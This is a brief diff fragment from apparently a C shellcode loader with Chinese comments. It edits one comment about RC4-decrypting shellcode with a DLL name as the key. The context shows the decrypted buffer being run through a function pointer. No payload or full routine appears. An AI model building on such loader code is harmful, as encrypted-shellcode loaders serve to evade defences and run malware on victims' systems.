@@ -28,7 +28,7 @@ VOID Entry() {
         exit(-1);
     }
 
-    // RC4解密shellcode (DLL名称作为密钥)
+    // 解密shellcode
     decrypt(shellcode, size, key, sizeof(key) - 1, shellcode);
     
     // 运行shellcode (以函数指针为例，可更换为其他方式)
